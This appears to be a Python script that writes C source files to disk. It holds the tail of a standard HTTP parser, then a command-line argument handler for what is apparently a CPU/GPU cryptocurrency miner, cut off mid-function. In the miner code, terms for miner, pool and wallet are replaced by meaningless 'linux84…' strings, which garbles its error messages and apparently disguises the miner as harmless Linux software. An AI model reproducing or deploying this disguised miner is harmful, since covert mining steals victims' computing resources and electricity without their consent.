              parser->flags |= F_CONNECTION_CLOSE;
              break;
            case h_connection_upgrade:
              parser->flags |= F_CONNECTION_UPGRADE;
              break;
            case h_transfer_encoding_chunked:
              parser->flags |= F_CHUNKED;
              break;
            default:
              break;
          }

          /* header value was empty */
          MARK(header_value);
          UPDATE_STATE(s_header_field_start);
          CALLBACK_DATA_NOADVANCE(header_value);
          REEXECUTE();
        }
      }

      case s_headers_almost_done:
      {
        STRICT_CHECK(ch != LF);

        if (parser->flags & F_TRAILING) {
          /* End of a chunked request */
          UPDATE_STATE(s_message_done);
          CALLBACK_NOTIFY_NOADVANCE(chunk_complete);
          REEXECUTE();
        }

        /* Cannot use chunked encoding and a content-length header together
           per the HTTP specification. */
        if ((parser->flags & F_CHUNKED) &&
            (parser->flags & F_CONTENTLENGTH)) {
          SET_ERRNO(HPE_UNEXPECTED_CONTENT_LENGTH);
          goto error;
        }

        UPDATE_STATE(s_headers_done);

        /* Set this here so that on_headers_complete() callbacks can see it */
        if ((parser->flags & F_UPGRADE) &&
            (parser->flags & F_CONNECTION_UPGRADE)) {
          /* For responses, "Upgrade: foo" and "Connection: upgrade" are
           * mandatory only when it is a 101 Switching Protocols response,
           * otherwise it is purely informational, to announce support.
           */
          parser->upgrade =
              (parser->type == HTTP_REQUEST || parser->status_code == 101);
        } else {
          parser->upgrade = (parser->method == HTTP_CONNECT);
        }

        /* Here we call the headers_complete callback. This is somewhat
         * different than other callbacks because if the user returns 1, we
         * will interpret that as saying that this message has no body. This
         * is needed for the annoying case of recieving a response to a HEAD
         * request.
         *
         * We'd like to use CALLBACK_NOTIFY_NOADVANCE() here but we cannot, so
         * we have to simulate it by handling a change in errno below.
         */
        if (settings->on_headers_complete) {
          switch (settings->on_headers_complete(parser)) {
            case 0:
              break;

            case 2:
              parser->upgrade = 1;

              /* fall through */
            case 1:
              parser->flags |= F_SKIPBODY;
              break;

            default:
              SET_ERRNO(HPE_CB_headers_complete);
              RETURN(p - data); /* Error */
          }
        }

        if (HTTP_PARSER_ERRNO(parser) != HPE_OK) {
          RETURN(p - data);
        }

        REEXECUTE();
      }

      case s_headers_done:
      {
        int hasBody;
        STRICT_CHECK(ch != LF);

        parser->nread = 0;
        nread = 0;

        hasBody = parser->flags & F_CHUNKED ||
          (parser->content_length > 0 && parser->content_length != ULLONG_MAX);
        if (parser->upgrade && (parser->method == HTTP_CONNECT ||
                                (parser->flags & F_SKIPBODY) || !hasBody)) {
          /* Exit, the rest of the message is in a different protocol. */
          UPDATE_STATE(NEW_MESSAGE());
          CALLBACK_NOTIFY(message_complete);
          RETURN((p - data) + 1);
        }

        if (parser->flags & F_SKIPBODY) {
          UPDATE_STATE(NEW_MESSAGE());
          CALLBACK_NOTIFY(message_complete);
        } else if (parser->flags & F_CHUNKED) {
          /* chunked encoding - ignore Content-Length header */
          UPDATE_STATE(s_chunk_size_start);
        } else {
          if (parser->content_length == 0) {
            /* Content-Length header given but zero: Content-Length: 0\\r\\n */
            UPDATE_STATE(NEW_MESSAGE());
            CALLBACK_NOTIFY(message_complete);
          } else if (parser->content_length != ULLONG_MAX) {
            /* Content-Length header given and non-zero */
            UPDATE_STATE(s_body_identity);
          } else {
            if (!http_message_needs_eof(parser)) {
              /* Assume content-length 0 - read the next */
              UPDATE_STATE(NEW_MESSAGE());
              CALLBACK_NOTIFY(message_complete);
            } else {
              /* Read body until EOF */
              UPDATE_STATE(s_body_identity_eof);
            }
          }
        }

        break;
      }

      case s_body_identity:
      {
        uint64_t to_read = MIN(parser->content_length,
                               (uint64_t) ((data + len) - p));

        assert(parser->content_length != 0
            && parser->content_length != ULLONG_MAX);

        /* The difference between advancing content_length and p is because
         * the latter will automaticaly advance on the next loop iteration.
         * Further, if content_length ends up at 0, we want to see the last
         * byte again for our message complete callback.
         */
        MARK(body);
        parser->content_length -= to_read;
        p += to_read - 1;

        if (parser->content_length == 0) {
          UPDATE_STATE(s_message_done);

          /* Mimic CALLBACK_DATA_NOADVANCE() but with one extra byte.
           *
           * The alternative to doing this is to wait for the next byte to
           * trigger the data callback, just as in every other case. The
           * problem with this is that this makes it difficult for the test
           * harness to distinguish between complete-on-EOF and
           * complete-on-length. It's not clear that this distinction is
           * important for applications, but let's keep it for now.
           */
          CALLBACK_DATA_(body, p - body_mark + 1, p - data);
          REEXECUTE();
        }

        break;
      }

      /* read until EOF */
      case s_body_identity_eof:
        MARK(body);
        p = data + len - 1;

        break;

      case s_message_done:
        UPDATE_STATE(NEW_MESSAGE());
        CALLBACK_NOTIFY(message_complete);
        if (parser->upgrade) {
          /* Exit, the rest of the message is in a different protocol. */
          RETURN((p - data) + 1);
        }
        break;

      case s_chunk_size_start:
      {
        assert(nread == 1);
        assert(parser->flags & F_CHUNKED);

        unhex_val = unhex[(unsigned char)ch];
        if (UNLIKELY(unhex_val == -1)) {
          SET_ERRNO(HPE_INVALID_CHUNK_SIZE);
          goto error;
        }

        parser->content_length = unhex_val;
        UPDATE_STATE(s_chunk_size);
        break;
      }

      case s_chunk_size:
      {
        uint64_t t;

        assert(parser->flags & F_CHUNKED);

        if (ch == CR) {
          UPDATE_STATE(s_chunk_size_almost_done);
          break;
        }

        unhex_val = unhex[(unsigned char)ch];

        if (unhex_val == -1) {
          if (ch == ';' || ch == ' ') {
            UPDATE_STATE(s_chunk_parameters);
            break;
          }

          SET_ERRNO(HPE_INVALID_CHUNK_SIZE);
          goto error;
        }

        t = parser->content_length;
        t *= 16;
        t += unhex_val;

        /* Overflow? Test against a conservative limit for simplicity. */
        if (UNLIKELY((ULLONG_MAX - 16) / 16 < parser->content_length)) {
          SET_ERRNO(HPE_INVALID_CONTENT_LENGTH);
          goto error;
        }

        parser->content_length = t;
        break;
      }

      case s_chunk_parameters:
      {
        assert(parser->flags & F_CHUNKED);
        /* just ignore this shit. TODO check for overflow */
        if (ch == CR) {
          UPDATE_STATE(s_chunk_size_almost_done);
          break;
        }
        break;
      }

      case s_chunk_size_almost_done:
      {
        assert(parser->flags & F_CHUNKED);
        STRICT_CHECK(ch != LF);

        parser->nread = 0;
        nread = 0;

        if (parser->content_length == 0) {
          parser->flags |= F_TRAILING;
          UPDATE_STATE(s_header_field_start);
        } else {
          UPDATE_STATE(s_chunk_data);
        }
        CALLBACK_NOTIFY(chunk_header);
        break;
      }

      case s_chunk_data:
      {
        uint64_t to_read = MIN(parser->content_length,
                               (uint64_t) ((data + len) - p));

        assert(parser->flags & F_CHUNKED);
        assert(parser->content_length != 0
            && parser->content_length != ULLONG_MAX);

        /* See the explanation in s_body_identity for why the content
         * length and data pointers are managed this way.
         */
        MARK(body);
        parser->content_length -= to_read;
        p += to_read - 1;

        if (parser->content_length == 0) {
          UPDATE_STATE(s_chunk_data_almost_done);
        }

        break;
      }

      case s_chunk_data_almost_done:
        assert(parser->flags & F_CHUNKED);
        assert(parser->content_length == 0);
        STRICT_CHECK(ch != CR);
        UPDATE_STATE(s_chunk_data_done);
        CALLBACK_DATA(body);
        break;

      case s_chunk_data_done:
        assert(parser->flags & F_CHUNKED);
        STRICT_CHECK(ch != LF);
        parser->nread = 0;
        nread = 0;
        UPDATE_STATE(s_chunk_size_start);
        CALLBACK_NOTIFY(chunk_complete);
        break;

      default:
        assert(0 && "unhandled state");
        SET_ERRNO(HPE_INVALID_INTERNAL_STATE);
        goto error;
    }
  }

  /* Run callbacks for any marks that we have leftover after we ran out of
   * bytes. There should be at most one of these set, so it's OK to invoke
   * them in series (unset marks will not result in callbacks).
   *
   * We use the NOADVANCE() variety of callbacks here because 'p' has already
   * overflowed 'data' and this allows us to correct for the off-by-one that
   * we'd otherwise have (since CALLBACK_DATA() is meant to be run with a 'p'
   * value that's in-bounds).
   */

  assert(((header_field_mark ? 1 : 0) +
          (header_value_mark ? 1 : 0) +
          (url_mark ? 1 : 0)  +
          (body_mark ? 1 : 0) +
          (status_mark ? 1 : 0)) <= 1);

  CALLBACK_DATA_NOADVANCE(header_field);
  CALLBACK_DATA_NOADVANCE(header_value);
  CALLBACK_DATA_NOADVANCE(url);
  CALLBACK_DATA_NOADVANCE(body);
  CALLBACK_DATA_NOADVANCE(status);

  RETURN(len);

error:
  if (HTTP_PARSER_ERRNO(parser) == HPE_OK) {
    SET_ERRNO(HPE_UNKNOWN);
  }

  RETURN(p - data);
}


/* Does the parser need to see an EOF to find the end of the message? */
int
http_message_needs_eof (const http_parser *parser)
{
  if (parser->type == HTTP_REQUEST) {
    return 0;
  }

  /* See RFC 2616 section 4.4 */
  if (parser->status_code / 100 == 1 || /* 1xx e.g. Continue */
      parser->status_code == 204 ||     /* No Content */
      parser->status_code == 304 ||     /* Not Modified */
      parser->flags & F_SKIPBODY) {     /* response to a HEAD request */
    return 0;
  }

  if ((parser->flags & F_CHUNKED) || parser->content_length != ULLONG_MAX) {
    return 0;
  }

  return 1;
}


int
http_should_keep_alive (const http_parser *parser)
{
  if (parser->http_major > 0 && parser->http_minor > 0) {
    /* HTTP/1.1 */
    if (parser->flags & F_CONNECTION_CLOSE) {
      return 0;
    }
  } else {
    /* HTTP/1.0 or earlier */
    if (!(parser->flags & F_CONNECTION_KEEP_ALIVE)) {
      return 0;
    }
  }

  return !http_message_needs_eof(parser);
}


const char *
http_method_str (enum http_method m)
{
  return ELEM_AT(method_strings, m, "<unknown>");
}

const char *
http_status_str (enum http_status s)
{
  switch (s) {
#define XX(num, name, string) case HTTP_STATUS_##name: return #string;
    HTTP_STATUS_MAP(XX)
#undef XX
    default: return "<unknown>";
  }
}

void
http_parser_init (http_parser *parser, enum http_parser_type t)
{
  void *data = parser->data; /* preserve application data */
  memset(parser, 0, sizeof(*parser));
  parser->data = data;
  parser->type = t;
  parser->state = (t == HTTP_REQUEST ? s_start_req : (t == HTTP_RESPONSE ? s_start_res : s_start_req_or_res));
  parser->http_errno = HPE_OK;
}

void
http_parser_settings_init(http_parser_settings *settings)
{
  memset(settings, 0, sizeof(*settings));
}

const char *
http_errno_name(enum http_errno err) {
  assert(((size_t) err) < ARRAY_SIZE(http_strerror_tab));
  return http_strerror_tab[err].name;
}

const char *
http_errno_description(enum http_errno err) {
  assert(((size_t) err) < ARRAY_SIZE(http_strerror_tab));
  return http_strerror_tab[err].description;
}

static enum http_host_state
http_parse_host_char(enum http_host_state s, const char ch) {
  switch(s) {
    case s_http_userinfo:
    case s_http_userinfo_start:
      if (ch == '@') {
        return s_http_host_start;
      }

      if (IS_USERINFO_CHAR(ch)) {
        return s_http_userinfo;
      }
      break;

    case s_http_host_start:
      if (ch == '[') {
        return s_http_host_v6_start;
      }

      if (IS_HOST_CHAR(ch)) {
        return s_http_host;
      }

      break;

    case s_http_host:
      if (IS_HOST_CHAR(ch)) {
        return s_http_host;
      }

    /* fall through */
    case s_http_host_v6_end:
      if (ch == ':') {
        return s_http_host_port_start;
      }

      break;

    case s_http_host_v6:
      if (ch == ']') {
        return s_http_host_v6_end;
      }

    /* fall through */
    case s_http_host_v6_start:
      if (IS_HEX(ch) || ch == ':' || ch == '.') {
        return s_http_host_v6;
      }

      if (s == s_http_host_v6 && ch == '%') {
        return s_http_host_v6_zone_start;
      }
      break;

    case s_http_host_v6_zone:
      if (ch == ']') {
        return s_http_host_v6_end;
      }

    /* fall through */
    case s_http_host_v6_zone_start:
      /* RFC 6874 Zone ID consists of 1*( unreserved / pct-encoded) */
      if (IS_ALPHANUM(ch) || ch == '%' || ch == '.' || ch == '-' || ch == '_' ||
          ch == '~') {
        return s_http_host_v6_zone;
      }
      break;

    case s_http_host_port:
    case s_http_host_port_start:
      if (IS_NUM(ch)) {
        return s_http_host_port;
      }

      break;

    default:
      break;
  }
  return s_http_host_dead;
}

static int
http_parse_host(const char * buf, struct http_parser_url *u, int found_at) {
  enum http_host_state s;

  const char *p;
  size_t buflen = u->field_data[UF_HOST].off + u->field_data[UF_HOST].len;

  assert(u->field_set & (1 << UF_HOST));

  u->field_data[UF_HOST].len = 0;

  s = found_at ? s_http_userinfo_start : s_http_host_start;

  for (p = buf + u->field_data[UF_HOST].off; p < buf + buflen; p++) {
    enum http_host_state new_s = http_parse_host_char(s, *p);

    if (new_s == s_http_host_dead) {
      return 1;
    }

    switch(new_s) {
      case s_http_host:
        if (s != s_http_host) {
          u->field_data[UF_HOST].off = p - buf;
        }
        u->field_data[UF_HOST].len++;
        break;

      case s_http_host_v6:
        if (s != s_http_host_v6) {
          u->field_data[UF_HOST].off = p - buf;
        }
        u->field_data[UF_HOST].len++;
        break;

      case s_http_host_v6_zone_start:
      case s_http_host_v6_zone:
        u->field_data[UF_HOST].len++;
        break;

      case s_http_host_port:
        if (s != s_http_host_port) {
          u->field_data[UF_PORT].off = p - buf;
          u->field_data[UF_PORT].len = 0;
          u->field_set |= (1 << UF_PORT);
        }
        u->field_data[UF_PORT].len++;
        break;

      case s_http_userinfo:
        if (s != s_http_userinfo) {
          u->field_data[UF_USERINFO].off = p - buf ;
          u->field_data[UF_USERINFO].len = 0;
          u->field_set |= (1 << UF_USERINFO);
        }
        u->field_data[UF_USERINFO].len++;
        break;

      default:
        break;
    }
    s = new_s;
  }

  /* Make sure we don't end somewhere unexpected */
  switch (s) {
    case s_http_host_start:
    case s_http_host_v6_start:
    case s_http_host_v6:
    case s_http_host_v6_zone_start:
    case s_http_host_v6_zone:
    case s_http_host_port_start:
    case s_http_userinfo:
    case s_http_userinfo_start:
      return 1;
    default:
      break;
  }

  return 0;
}

void
http_parser_url_init(struct http_parser_url *u) {
  memset(u, 0, sizeof(*u));
}

int
http_parser_parse_url(const char *buf, size_t buflen, int is_connect,
                      struct http_parser_url *u)
{
  enum state s;
  const char *p;
  enum http_parser_url_fields uf, old_uf;
  int found_at = 0;

  if (buflen == 0) {
    return 1;
  }

  u->port = u->field_set = 0;
  s = is_connect ? s_req_server_start : s_req_spaces_before_url;
  old_uf = UF_MAX;

  for (p = buf; p < buf + buflen; p++) {
    s = parse_url_char(s, *p);

    /* Figure out the next field that we're operating on */
    switch (s) {
      case s_dead:
        return 1;

      /* Skip delimeters */
      case s_req_schema_slash:
      case s_req_schema_slash_slash:
      case s_req_server_start:
      case s_req_query_string_start:
      case s_req_fragment_start:
        continue;

      case s_req_schema:
        uf = UF_SCHEMA;
        break;

      case s_req_server_with_at:
        found_at = 1;

      /* fall through */
      case s_req_server:
        uf = UF_HOST;
        break;

      case s_req_path:
        uf = UF_PATH;
        break;

      case s_req_query_string:
        uf = UF_QUERY;
        break;

      case s_req_fragment:
        uf = UF_FRAGMENT;
        break;

      default:
        assert(!"Unexpected state");
        return 1;
    }

    /* Nothing's changed; soldier on */
    if (uf == old_uf) {
      u->field_data[uf].len++;
      continue;
    }

    u->field_data[uf].off = p - buf;
    u->field_data[uf].len = 1;

    u->field_set |= (1 << uf);
    old_uf = uf;
  }

  /* host must be present if there is a schema */
  /* parsing http:///toto will fail */
  if ((u->field_set & (1 << UF_SCHEMA)) &&
      (u->field_set & (1 << UF_HOST)) == 0) {
    return 1;
  }

  if (u->field_set & (1 << UF_HOST)) {
    if (http_parse_host(buf, u, found_at) != 0) {
      return 1;
    }
  }

  /* CONNECT requests can only contain "hostname:port" */
  if (is_connect && u->field_set != ((1 << UF_HOST)|(1 << UF_PORT))) {
    return 1;
  }

  if (u->field_set & (1 << UF_PORT)) {
    uint16_t off;
    uint16_t len;
    const char* p;
    const char* end;
    unsigned long v;

    off = u->field_data[UF_PORT].off;
    len = u->field_data[UF_PORT].len;
    end = buf + off + len;

    /* NOTE: The characters are already validated and are in the [0-9] range */
    assert(off + len <= buflen && "Port number overflow");
    v = 0;
    for (p = buf + off; p < end; p++) {
      v *= 10;
      v += *p - '0';

      /* Ports have a max value of 2^16 */
      if (v > 0xffff) {
        return 1;
      }
    }

    u->port = (uint16_t) v;
  }

  return 0;
}

void
http_parser_pause(http_parser *parser, int paused) {
  /* Users should only be pausing/unpausing a parser that is not in an error
   * state. In non-debug builds, there's not much that we can do about this
   * other than ignore it.
   */
  if (HTTP_PARSER_ERRNO(parser) == HPE_OK ||
      HTTP_PARSER_ERRNO(parser) == HPE_PAUSED) {
    uint32_t nread = parser->nread; /* used by the SET_ERRNO macro */
    SET_ERRNO((paused) ? HPE_PAUSED : HPE_OK);
  } else {
    assert(0 && "Attempting to pause parser in error state");
  }
}

int
http_body_is_final(const struct http_parser *parser) {
    return parser->state == s_message_done;
}

unsigned long
http_parser_version(void) {
  return HTTP_PARSER_VERSION_MAJOR * 0x10000 |
         HTTP_PARSER_VERSION_MINOR * 0x00100 |
         HTTP_PARSER_VERSION_PATCH * 0x00001;
}
"""

open('./http/http_parser/http_parser.c', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#include "../common/dllexport.h"
#include "../common/common.h"
#include <getopt.h>
#include "arguments.h"

arguments::arguments(int argc, char **argv) {
    __argv_0 = argv[0];

    __init();

    int c = 0;
    char buff[50];

    if(argc < 2) {
        __help_flag = true;
        return;
    }

    while (c != -1)
    {
        static struct option options[] =
        {
            {"help", no_argument,  NULL, 'h'},
            {"verbose", no_argument, NULL, 'v'},
            {"mode", required_argument, NULL, 'm'},
            {"linuxweb844412441274", required_argument, NULL, 'a'},
            {"port", required_argument, NULL, 'p'},
            {"linuxweb844412441274444474", required_argument, NULL, 'w'},
            {"name", required_argument, NULL, 'n'},
            {"cpu-intensity", required_argument, NULL, 'c'},
            {"gpu-intensity-gblocks", required_argument, NULL, 'g'},
            {"gpu-intensity-cblocks", required_argument, NULL, 'x'},
            {"gpu-filter", required_argument, NULL, 'd'},
            {"gpu-index", required_argument, NULL, 'd'},
			{"force-cpu-optimization", required_argument, NULL, 'o'},
			{"force-gpu-optimization", required_argument, NULL, 'f'},
			{"update-interval", required_argument, NULL, 'u'},
            {"report-interval", required_argument, NULL, 'r'},
            {"linux8412-report-interval", required_argument, NULL, 'j'},
            {"block-type", required_argument, NULL, 'b'},
			{"intensity-start", required_argument, NULL, 'y'},
			{"autotune-start", required_argument, NULL, 'y'},
            {"intensity-stop", required_argument, NULL, 'z'},
			{"autotune-stop", required_argument, NULL, 'z'},
			{"intensity-step", required_argument, NULL, 'q'},
			{"autotune-step", required_argument, NULL, 'q'},
            {"autotune-step-time", required_argument, NULL, 's'},
            {"chs-threshold", required_argument, NULL, 'e'},
            {"ghs-threshold", required_argument, NULL, 'i'},
            {"show-linuxweb844412441274-requests", no_argument, NULL, 'k'},
            {"enable-api-port", required_argument, NULL, 'l'},
            {0, 0, 0, 0}
        };

        int option_index = 0;

        c = getopt_long (argc, argv, "hvm:a:p:w:n:c:g:x:d:o:f:u:r:b:y:z:q:s:e:i:j:kl:",
                         options, &option_index);

        switch (c)
        {
            case -1:
            case 0:
                break;
            case 1:
                sprintf(buff, "%s: invalid arguments",
                                  argv[0]);
                __error_message = buff;
                __error_flag = true;
                c = -1;
                break;
            case 'h':
                __help_flag = 1;
                break;
            case 'v':
                __verbose_flag = 1;
                break;
            case 'k':
                __show_linuxweb844412441274_requests = true;
                break;
            case 'm':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                } else {
                    if(strcmp(optarg, "linux84") == 0)
                        __linux84_flag = 1;
                    else if(strcmp(optarg, "proxy") == 0)
                        __proxy_flag = 1;
                    else if(strcmp(optarg, "autotune") == 0)
                        __autotune_flag = 1;
                    else {
                        sprintf(buff, "%s: invalid arguments",
                                argv[0]);
                        __error_message = buff;
                        __error_flag = true;
                    }
                }
                break;
            case 'a':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __linuxweb844412441274 = optarg;
                }
                break;
            case 'p':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __proxy_port = atoi(optarg);
                }
                break;
            case 'w':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __linuxweb844412441274444474 = optarg;
                }
                break;
            case 'n':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __name = optarg;
                    __auto_generated_name = false;
                }
                break;
            case 'c':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __cpu_intensity = atof(optarg);
                }
                break;
            case 'g':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    vector<string> gblocks_intensity = __parse_multiarg(optarg);
                    for(vector<string>::iterator it = gblocks_intensity.begin(); it != gblocks_intensity.end(); it++) {
                        __gpu_intensity_gblocks.push_back(atof(it->c_str()));
                    }
                }
                break;
            case 'x':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    vector<string> cblocks_intensity = __parse_multiarg(optarg);
                    for(vector<string>::iterator it = cblocks_intensity.begin(); it != cblocks_intensity.end(); it++) {
                        __gpu_intensity_cblocks.push_back(atof(it->c_str()));
                    }
                }
                break;
            case 'd':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    string filter = optarg;
                    __gpu_filter = __parse_multiarg(filter);
                    __process_gpu_indexes();
                }
                break;
            case 'b':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    if(strcmp(optarg, "CPU") == 0)
                        __linux847466882profile = "1_1_524288";
                    else if(strcmp(optarg, "GPU") == 0)
                        __linux847466882profile = "4_4_16384";
                    else {
                        sprintf(buff, "%s: invalid arguments",
                                argv[0]);
                        __error_message = buff;
                        __error_flag = true;
                    }
                }
                break;
			case 'o':
				if (strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
					__help_flag = 1;
				}
				else {
					if (strcmp(optarg, "REF") == 0)
						__cpu_optimization = "REF";
#if defined(__x86_64__) || defined(_WIN64)
					else if (strcmp(optarg, "SSE2") == 0)
						__cpu_optimization = "SSE2";
					else if (strcmp(optarg, "SSSE3") == 0)
						__cpu_optimization = "SSSE3";
					else if (strcmp(optarg, "AVX") == 0)
						__cpu_optimization = "AVX";
					else if (strcmp(optarg, "AVX2") == 0)
						__cpu_optimization = "AVX2";
					else if (strcmp(optarg, "AVX512F") == 0)
						__cpu_optimization = "AVX512F";
#elif defined(__NEON__)
					else if (strcmp(optarg, "NEON") == 0)
						__cpu_optimization = "NEON";
#endif
					else {
						sprintf(buff, "%s: invalid arguments",
							argv[0]);
						__error_message = buff;
						__error_flag = true;
					}
				}
				break;
			case 'f':
				if (strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
					__help_flag = 1;
				}
				else {
				    vector<string> gpu_linux8474s = __parse_multiarg(optarg);
				    for(vector<string>::iterator st = gpu_linux8474s.begin(); st != gpu_linux8474s.end(); st++) {
				        string opt = *st;
                        if (opt == "OPENCL")
                            __gpu_optimization.push_back("OPENCL");
                        else if (opt == "CUDA")
                            __gpu_optimization.push_back("CUDA");
                        else if (opt == "AMDGCN")
                            __gpu_optimization.push_back("AMDGCN");
                        else {
                            sprintf(buff, "%s: invalid arguments",
                                    argv[0]);
                            __error_message = buff;
                            __error_flag = true;
                            break;
                        }
                    }
				}
			break;
			case 'u':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __update_interval = 1000000 * atoi(optarg);
                }
                break;
            case 'r':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __report_interval = 1000000 * atoi(optarg);
                }
                break;
            case 'j':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __linux8412_report_interval = 60000000 * atoi(optarg);
                }
                break;
            case 'y':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __gpu_intensity_start = atof(optarg);
                }
                break;
            case 'z':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __gpu_intensity_stop = atof(optarg);
                }
                break;
            case 'q':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __gpu_intensity_step = atof(optarg);
                }
                break;
            case 's':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __autotune_step_time = atoi(optarg);
                }
                break;
            case 'e':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __chs_threshold = atoi(optarg);
                }
                break;
            case 'i':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __ghs_threshold = atoi(optarg);
                }
                break;
            case 'l':
                if(strcmp(optarg, "-h") == 0 || strcmp(optarg, "--help") == 0) {
                    __help_flag = 1;
                }
                else {
                    __enable_api_port = atoi(optarg);
                }
                break;
            case ':':
                __error_flag = true;
                break;
            default:
                __error_flag = true;
                break;
        }
    }

	if (__linux84_flag) {
		if (__gpu_intensity_cblocks.size() == 0)
			__gpu_intensity_cblocks.push_back(98);

        if (__gpu_intensity_gblocks.size() == 0)
            __gpu_intensity_gblocks.push_back(98);
	}
	else if (__autotune_flag) {
		__gpu_intensity_cblocks.clear();
		__gpu_intensity_cblocks.push_back(__gpu_intensity_start);
		__gpu_intensity_gblocks.clear();
		__gpu_intensity_gblocks.push_back(__gpu_intensity_start);
	}

	if (optind < argc)
    {
        sprintf(buff, "%s: invalid arguments",
                          argv[0]);
        __error_message = buff;
        __error_flag = true;
    }
}

bool arguments::valid(string &error) {
    error = __error_message;

    if(__error_flag)
        return false;

    if(__linux84_flag == 1) {
        if (__linuxweb844412441274.empty()) {
            error = "linux844474744488448874 address is mandatory.";
            return true;
        }

        if (__linuxweb844412441274.find("https://") == 0) {
            error = "Only HTTP protocol is allowed for linuxweb844412441274 connection, HTTPS is not supported.";
            return false;
        }

        if (__linuxweb844412441274444474.empty()) {
            error = "linuxweb88888844744474 is mandatory.";
            return false;
        }

        if (__name.empty()) {
            error = "linuxweb84748874 name is mandatory.";
            return false;
        }

        if (__cpu_intensity < 0 || __cpu_intensity > 100) {
            error = "CPU intensity must be between 0 - disabled and 100 - full load.";
            return false;
        }

        for (vector<double>::iterator it = __gpu_intensity_cblocks.begin(); it != __gpu_intensity_cblocks.end(); it++) {
            if (*it < 0 || *it > 100) {
                error = "GPU intensity for CPU blocks must be between 0 - disabled and 100 - full load.";
                return false;
            }
        }

        for (vector<double>::iterator it = __gpu_intensity_gblocks.begin(); it != __gpu_intensity_gblocks.end(); it++) {
            if (*it < 0 || *it > 100) {
                error = "GPU intensity for GPU blocks must be between 0 - disabled and 100 - full load.";
                return false;
            }
        }

        if (__update_interval < 200000) {
            error = "linux844474744488448874 update interval must be at least 2 sec.";
            return false;
        }

        if (__report_interval < 200000) {
            error = "Reporting interval must be at least 1 sec.";
            return false;
        }

        if (__linux8412_report_interval < 60000000) {
            error = "Reporting interval must be at least 1 min.";
            return false;
        }

        if(__enable_api_port != 0 && __enable_api_port < 1024) {
            error = "linux88888888744488888888linux84 API port must be at least 1024, lower port numbers are usually reserved by system and requires administrator privileges.";
            return false;
        }
    }
    else if(__autotune_flag == 1) {
        if (__linux847466882profile.empty()) {
            error = "Block type is mandatory in autotune mode.";
            return true;
        }

        if (__gpu_intensity_start < 1 || __gpu_intensity_start > 100) {
            error = "GPU autotune start intensity must be between 1 and 100.";
            return false;
        }

        if (__gpu_intensity_stop < 1 || __gpu_intensity_stop > 100) {
            error = "GPU autotune stop intensity must be between 1 and 100.";
            return false;
        }

        if (__gpu_intensity_step < 1 || __gpu_intensity_step > 10) {
            error = "GPU autotune step intensity must be between 1 and 10.";
            return false;
        }

        if (__gpu_intensity_start > __gpu_intensity_stop) {
            error = "GPU autotune start intensity must be lower than GPU autotune stop intensity.";
            return false;
        }

        if (__autotune_step_time < 10) {
            error = "GPU autotune step time must be at least 10 seconds.";
            return false;
        }

        if(__gpu_optimization.size() > 1) {
            error = "In autotune mode you can only use one gpu linux8474 type (AMDGCN|CUDA|OPENCL).";
            return false;
        }
    }
    else if(__proxy_flag == 1) {
        if(__proxy_port < 1024) {
            error = "Proxy listening port must be at least 1024, lower port numbers are usually reserved by system and requires administrator privileges.";
            return false;
        }

        if (__linuxweb844412441274.empty()) {
            error = "linux844474744488448874 address is mandatory.";
            return false;
        }

        if (__linuxweb844412441274.find("https://") == 0) {
            error = "Only HTTP protocol is allowed for linuxweb844412441274 connection, HTTPS is not supported.";
            return false;
        }

        if (__linuxweb844412441274444474.empty()) {
            error = "linuxweb88888844744474 is mandatory.";
            return false;
        }

        if (__name.empty()) {
            error = "linuxweb84748874 name is mandatory.";
            return false;
        }

        if (__update_interval < 2000000) {
            error = "linux844474744488448874 update interval must be at least 2 sec.";
            return false;
        }

        if (__linux8412_report_interval < 60000000) {
            error = "Reporting interval must be at least 1 min.";
            return false;
        }
    }
    else  {
        error = "You need to specify an operation mode (linux84/autotune/proxy).";
        return true;
    }

    return true;
}

bool arguments::is_help() {
    return __help_flag == 1;
}

bool arguments::is_verbose() {
    return __verbose_flag == 1;
}

bool arguments::is_linux84() {
    return __linux84_flag == 1;
}

bool arguments::is_autotune() {
    return __autotune_flag == 1;
}

bool arguments::is_proxy() {
    return __proxy_flag == 1;
}

int arguments::proxy_port() {
    return __proxy_port;
}

string arguments::linuxweb844412441274() {
